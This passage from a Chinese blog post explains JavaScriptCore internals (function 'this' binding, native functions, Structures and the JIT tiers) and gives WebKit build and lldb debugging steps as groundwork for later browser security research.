），<code>this</code>指向新创建的对象，在Function定义期间，构造函数就已经为新对象设置了<code>.prototype</code>属性。</li><li>如果Function作为某个对象的方法被调用（obj.func(…)），<code>this</code>将指向这个对象。</li><li>否则<code>this</code>只是指向当前的全局对象，因为它在Function之外使用。</li></ul><p>因为Functions是JavaScript中十分重要的对象，它们同样具有属性。根据刚才的描述我们知道了<code>.prototype</code>属性，另外每个Function（实际上是Function prototype）还有两个比较有趣的属性，<code>.call</code>和<code>.apply</code>函数，允许使用给定的<code>this</code>和一些参数来调用Function。例如，可以使用它们来完成装饰器的功能：</p><pre><code class="javascript">function decorate(func) {    return function() {        for (var i = 0; i &lt; arguments.length; i++) {            // do something with arguments[i]        }        return func.apply(this, arguments);    };}</code></pre><p>这同样也对Function在JS引擎的内部实现有一定的影响，这个导致了Function不能假定调用它们的对象的类型，因为这些对象可能是任意类型，因此所有的JavaScript内部Funciton不仅要检查参数的类型，也要对<code>this</code>对象进行类型检查。</p><p>在内部，内置的函数或者方法通常以两种方法实现，C++的Native Function或者是JavaScript Function。可以看一个JSC中的Native Function示例，<code>Math.pow()</code>的实现：</p><pre><code class="c"> EncodedJSValue JSC_HOST_CALL mathProtoFuncPow(ExecState* exec){   // ECMA 15.8.2.1.13   double arg = exec-&gt;argument(0).toNumber(exec);   double arg2 = exec-&gt;argument(1).toNumber(exec);   return JSValue::encode(JSValue(operationMathPow(arg, arg2))); }</code></pre><p>我们可以看到：</p><ol><li>Native JavaScript Function的签名。</li><li>如何使用<code>argument</code>提取参数（如果参数不够就返回undefine）。</li><li>如何将参数转化为需要的类型，有一组特定的转换规则，这一点将在之后详细讨论。</li><li>如何对本地数据类型进行实际操作。</li><li>如何将结果返回给调用者，这里简单地将结果编码为了JSValue。</li></ol><p>这里还有一个显而易见的部分，各种核心的操作(<code>operationMathPow(arg, arg2)</code>)都是用单独的函数，这样它们可以直接被JIT编译了的代码调用。</p><h4 id="The-Structures"><a href="#The-Structures" class="headerlink" title="The Structures"></a>The Structures</h4><p>这个部分属于JavaScript对象模型的内容，关系到JavaScript引擎如何去访问对象的属性。因为访问属性在JavaScript中是一个十分频繁的操作，为了提高访问速度，每个主流的JavaScript引擎都对此做了优化，在不同的引擎中对这种技术的称呼也各不相同：</p><ul><li>在学术论文中被称为 <em>Hidden Classes</em></li><li>在V8中是 <em>Maps</em></li><li>在Chakra中是 <em>Types</em></li><li>在JavaScriptCore中是 <em>Structures</em></li><li>在Spidermonkey中是 <em>Shapes</em></li></ul><p>根据ECMAScript的规范，所有JavaScript对象都被定义为一个由字符串键值映射到属性值的一个字典。引用MDN的描述：</p><blockquote><p>An object is a collection of properties, and a property is an association between a name (or <em>key</em>) and a value.</p></blockquote><p>既然如此，作为键值的字符串如果存储在对象的内存中将会十分浪费空间，因为这样的话每生成一个对象就出多出一份键值的拷贝。而在JavaScript中，多个对象具有相同的属性是经常发生的事情，从某个方面来讲，这些对象都具有相同的形状（Shapes），也可以说具有相同的结构（Structure）。比如：</p><pre><code class="javascript">const object1 = { x: 1, y: 2 };const object2 = { x: 3, y: 4 };</code></pre><p><code>object1</code>和<code>object2</code>虽然是两个不同的对象，但是他们的键值都是一样的。这种情况下它们就具有相同的结构，在JavaScriptCore中也能看到它们具有相同的StructureID。</p><pre><code class="shell">&gt;&gt;&gt; describe(object1)Object: 0x106ab0100 with butterfly 0x0 (Structure 0x106a500e0:[Object, {x:0, y:1}, NonArray, Proto:0x106ab4000, Leaf]), StructureID: 289&gt;&gt;&gt; describe(object2)Object: 0x106ab0140 with butterfly 0x0 (Structure 0x106a500e0:[Object, {x:0, y:1}, NonArray, Proto:0x106ab4000, Leaf]), StructureID: 289&gt;&gt;&gt;</code></pre><p>如果我们要访问对象的属性，JSC就会先根据StructureID找到对应的Structure，然后找到对应的属性名，读取属性在内联存储或者是butterfly中的偏移值，最后读取属性值。</p><p>如果此时给<code>object2</code>增加一个属性<code>z</code>，JavaScriptCore就会在Structure链中寻找有没有只拥有<code>x,y,z</code>三个属性的Structure，如果没有则重新创建一个并分配一个新的StructureID。</p><pre><code class="shell">&gt;&gt;&gt; objectY.z = 00&gt;&gt;&gt; describe(objectY)Object: 0x106ab0140 with butterfly 0x0 (Structure 0x106a50150:[Object, {x:0, y:1, z:2}, NonArray, Proto:0x106ab4000, Leaf]), StructureID: 290&gt;&gt;&gt;</code></pre><h4 id="Just-In-Time-compiler"><a href="#Just-In-Time-compiler" class="headerlink" title="Just-In-Time compiler"></a>Just-In-Time compiler</h4><p>前面提到过JIT，但没有细说。其实JIT也是一个编译器，可以简单理解为和gcc一样的编译器，不过JS引擎中的JIT是将JavaScript代码编译成了机器码。JIT在JSC中一共分为四个等级：</p><ol><li>LLInt (LowLevelInterpreter)</li><li>Baseline JIT compiler</li><li>DFG JIT</li><li>FTL JIT</li></ol><h5 id="LLInt"><a href="#LLInt" class="headerlink" title="LLInt"></a>LLInt</h5><p>llint是JavaScriptCore虚拟机的基础组件，逻辑非常简单，可以理解为一个switch循环，传入对应的JavaScript机器码，然后执行对应的指令。</p><h5 id="Baseline-JIT-compiler"><a href="#Baseline-JIT-compiler" class="headerlink" title="Baseline JIT compiler"></a>Baseline JIT compiler</h5><p>当一个function被多次调用之后，它就会变得”hot”，这时候就需要使用JIT compiler对它进行优化。在<code>Source/JavaScriptCore/jit/JIT.cpp</code>中：</p><blockquote><p><em>// We can only do this optimization because we execute ProgramCodeBlock’s exactly once.</em></p><p>// This optimization would be invalid otherwise. When the LLInt determines it wants to*</p><p><em>// do OSR entry into the baseline JIT in a loop, it will pass in the bytecode offset it</em></p><p><em>// was executing at when it kicked off our compilation. We only need to compile code for</em></p><p><em>// anything reachable from that bytecode offset.</em></p></blockquote><p>当function需要进一步优化的时候，JSC就会通过OSR（On Stack Replacement ）从LLInt切换到Baseline JIT。</p><h5 id="DFG-JIT"><a href="#DFG-JIT" class="headerlink" title="DFG JIT"></a>DFG JIT</h5><p>引用WebKit官方文档<a href="https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/" target="_blank" rel="noopener">WebKit JIT</a>中的一段话：</p><blockquote><p>The first execution of any function always starts in the interpreter tier. As soon as any statement in the function executes more than 100 times, or the function is called more than 6 times (whichever comes first), execution is diverted into code compiled by the Baseline JIT. This eliminates some of the interpreter’s overhead but lacks any serious compiler optimizations. Once any statement executes more than 1000 times in Baseline code, or the Baseline function is invoked more than 66 times, we divert execution again to the DFG JIT.</p></blockquote><p>和前面从LLInt切换到Baseline JIT的条件类似，如果一个函数在Baseline JIT中执行次数过多，又会切换到DFG JIT中。</p><p>从文档中还可以看到一个关于DFG的细节：</p><blockquote><p>The DFG starts by converting bytecode into the DFG CPS form, which reveals data flow relationships between variables and temporaries. Then profiling information is used to infer guesses about types, and those guesses are used to insert a minimal set of type checks. Traditional compiler optimizations follow. The compiler finishes by generating machine code directly from the DFG CPS form.</p></blockquote><p>DFG会根据搜集到的信息去推测变量的类型，如果认定了一个变量的类型，在之后将不会对变量类型进行检查，这个对我们之后的利用会很有帮助。</p><h5 id="FTL-JIT"><a href="#FTL-JIT" class="headerlink" title="FTL JIT"></a>FTL JIT</h5><blockquote><p>We reuse most of the DFG phases including its CPS-based optimizations. The new FTL pipeline is a drop-in replacement for the third-tier DFG backend. It involves additional JavaScript-aware optimizations over DFG SSA form, followed by a phase that lowers DFG IR (<em>intermediate representation</em>) to LLVM IR. We then invoke LLVM’s optimization pipeline and LLVM’s MCJIT backend to generate machine code.</p></blockquote><p>其实FTL相对于其他三个JIT算是新加入的一个技术，设计它的目的是想让JavsScript的运行更加接近C的速度，事实证明确实非常接近了。值得一提的是FTL重用了DFG的一些部分，包括类型推理引擎。</p><h3 id="0x02-搭建调试环境"><a href="#0x02-搭建调试环境" class="headerlink" title="0x02 搭建调试环境"></a>0x02 搭建调试环境</h3><p>官方文档：<a href="https://webkit.org/building-webkit/" target="_blank" rel="noopener">Building Webkit</a></p><p>我使用的系统是MacOS，不过WebKit同样可以在其他系统（Windows、Linux）编译运行，我看到大多数人会选择在Ubuntu 18.04上编译，不过我没编译成功过，不知道什么原因。我直接引用别人在Ubuntu 18.04的编译命令：</p><pre><code class="shell"># sudo apt install libicu-dev python ruby bison flex cmake build-essential ninja-build git gperf$ git clone git://git.webkit.org/WebKit.git &amp;&amp; cd WebKit$ Tools/gtk/install-dependencies$ Tools/Scripts/build-webkit --jsc-only --debug$ cd WebKitBuild/Debug$ LD_LIBRARY_PATH=./lib bin/jsc</code></pre><p>我说一下在MacOS的build流程。首先确保安装了Xcode和Xcode的命令行工具。</p><pre><code class="bash">#我的系统版本 macOS Mojave$ sw_versProductName:    Mac OS XProductVersion:    10.14.6BuildVersion:    18G84$ git clone git://git.webkit.org/WebKit.git WebKit#这个说明已经安装好了$ xcode-select --installxcode-select: error: command line tools are already installed, use &quot;Software Update&quot; to install updates#确定Xcode路径是否正确$ xcode-select -p/Applications/Xcode.app/Contents/Developer#Xcode路径和上面不一样的，可以是用如下命令切换$ sudo xcode-select --s /Applications/Xcode.app/Contents/Developer$ xcodebuild -versionXcode 10.3Build version 10G8#编译之前确定切换到漏洞分支$ git checkout ...#到WebKit根目录下执行这个指令就可以了$ Tools/Scripts/build-webkit --jsc-only --debug</code></pre><p>我可能运气比较好，到这里都没出现过什么问题。直接可以运行JSC的<em>REPL</em>(Read Eval Print Loop)。</p><pre><code class="shell">$ WebKitBuild/Debug/bin/jsc&gt;&gt;&gt; a = 11&gt;&gt;&gt;</code></pre><p>如果遇到<code>DYLD_FRAMEWORK_PATH</code>路径的问题可以手动设置一下环境变量：</p><pre><code class="shell">#补全为绝对路径就行了export DYLD_FRAMEWORK_PATH=.../WebKitBuild/Debug</code></pre><p>调试器我用的lldb，对比gdb的指令可以很快上手：<a href="https://lldb.llvm.org/use/map.html" target="_blank" rel="noopener">GDB to LLDB command map</a></p><h3 id="0x03-开始调试"><a href="#0x03-开始调试" class="headerlink" title="0x03 开始调试"></a>0x03 开始调试</h3><p>可以直接用lldb载入jsc：</p><pre><code class="bash">$ lldb ./WebKitBuild/Debug/bin/jsc(lldb) target create &quot;./WebKitBuild/Debug/bin/jsc&quot;Current executable set to &#39;./WebKitBuild/Debug/bin/jsc&#39; (x86_64).(lldb) runProcess 39132 launched: &#39;/Users/7o8v/Documents/SecResearch/Browser/WebKit/WebKit.git/WebKitBuild/Debug/bin/jsc&#39; (x86_64)&gt;&gt;&gt;</code></pre><p>调试过程中可以配合JSC提供的调试函数进行调试，比如<code>describe()</code>：</p><pre><code class="bash">&gt;&gt;&gt; a = [1,2,3]1,2,3&gt;&gt;&gt; describe(a)Object: 0x108ab4340 with butterfly 0x8000e4008 (Structure 0x108af2a00:[Array, {}, ArrayWithInt32, Proto:0x108ac80a0, Leaf]), StructureID: 97&gt;&gt;&gt; a[3] = 1.11.1&gt;&gt;&gt; describe(a)Object: 0x108ab4340 with butterfly 0x8000e4008 (Structure 0x108af2a70:[Array, {}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 98&gt;&gt;&gt; a[4] = {}[object Object]&gt;&gt;&gt; describe(a)Object: 0x108ab4340 with butterfly 0x8000e4008 (Structure 0x108af2ae0:[Array, {}, ArrayWithContiguous, Proto:0x108ac80a0]), StructureID: 99&gt;&gt;&gt;</code></pre><p>更多的调试技巧可以看这篇文章：<a href="http://dwfault-blog.imwork.net:30916/2019/01/03/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">WebKit JavaScriptCore的特殊调试技巧</a></p><p>过程中也可以使用<code>Ctrl+C</code>中断，然后使用lldb命令。</p><p>也可以载入JSC之后，运行脚本文件：</p><pre><code class="bash">$ lldb ./WebKitBuild/Debug/bin/jsc(lldb) target create &quot;./WebKitBuild/Debug/bin/jsc&quot;Current executable set to &#39;./WebKitBuild/Debug/bin/jsc&#39; (x86_64).(lldb) run -i ./poc.jsProcess 39152 launched: ...&gt;&gt;&gt;</code></pre><h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h3><p>[1] <a href="https://github.com/m1ghtym0/browser-pwn#safari-webkit" target="_blank" rel="noopener">https://github.com/m1ghtym0/browser-pwn#safari-webkit</a></p><p>[2] <a href="https://webkit.org/blog/6756/es6-feature-complete/" target="_blank" rel="noopener">https://webkit.org/blog/6756/es6-feature-complete/</a></p><p>[3] <a href="https://mathiasbynens.be/notes/shapes-ics" target="_blank" rel="noopener">https://mathiasbynens.be/notes/shapes-ics</a></p><p>[4] <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects</a></p><p>[5] <a href="https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/" target="_blank" rel="noopener">https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/</a></p><p>[6] <a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://phrack.org/papers/attacking_javascript_engines.html</a></p><p>[7] <a href="http://dwfault-blog.imwork.net:30916/2019/01/03/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">http://dwfault-blog.imwork.net:30916/2019/01/03/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</a></p><p>[8] <a href="https://webkit.org/blog/7846/concurrent-javascript-it-can-work/" target="_blank" rel="noopener">https://webkit.org/blog/7846/concurrent-javascript-it-can-work/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Browser </tag>
            
            <tag> JavascriptEngine </tag>
            
            <tag> JavascriptCore </tag>
            
            <tag> Webkit </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
